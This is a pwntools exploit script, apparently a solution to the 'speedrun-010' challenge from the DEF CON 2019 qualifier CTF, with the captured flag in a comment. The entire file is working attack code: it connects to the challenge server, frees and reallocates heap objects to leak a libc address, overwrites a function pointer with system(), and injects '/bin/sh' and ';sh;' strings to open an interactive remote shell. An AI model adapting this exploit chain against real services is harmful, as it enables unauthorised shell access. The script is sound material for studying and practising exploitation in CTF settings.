#!/usr/bin/env python
from pwn import *

# OOO{Yeah, he's loony. He just like his toons. Aren't W#_____411???}

e , l = ELF( './speedrun-010' ) , ELF( './libc-2.27.so' )

context.arch = 'amd64'
host , port = 'speedrun-010.quals2019.oooverflow.io' , 31337
y = remote( host , port )
#y = process( './speedrun-010' )
#pause()

def adn( name ):
    y.sendafter( 'or 5' , '1' )
    y.sendafter( 'name' , name )

def adm( msg ):
    y.sendafter( 'or 5' , '2' )
    y.sendafter( 'message' , msg )

def fn():
    y.sendafter( 'or 5' , '3' )

def fm():
    y.sendafter( 'or 5' , '4' )

adn( 'a' * 0x10 )
adm( 'A' * 0x10 )
fm()
adn( 'a' * 1 )
adm( 'B' * 0x10 )
y.recvline()

l.address = u64( y.recv(6) + '\0\0' ) - 0x80961
success( 'libc -> %s' % hex( l.address ) )

fn()
adn( '/bin/sh\0' )
fn()

one = 0x10a38c

adm( ';sh;sh;sh;sh;sh;'.ljust( 0x10 , '\0' ) + p64( l.sym.system ) )

y.interactive()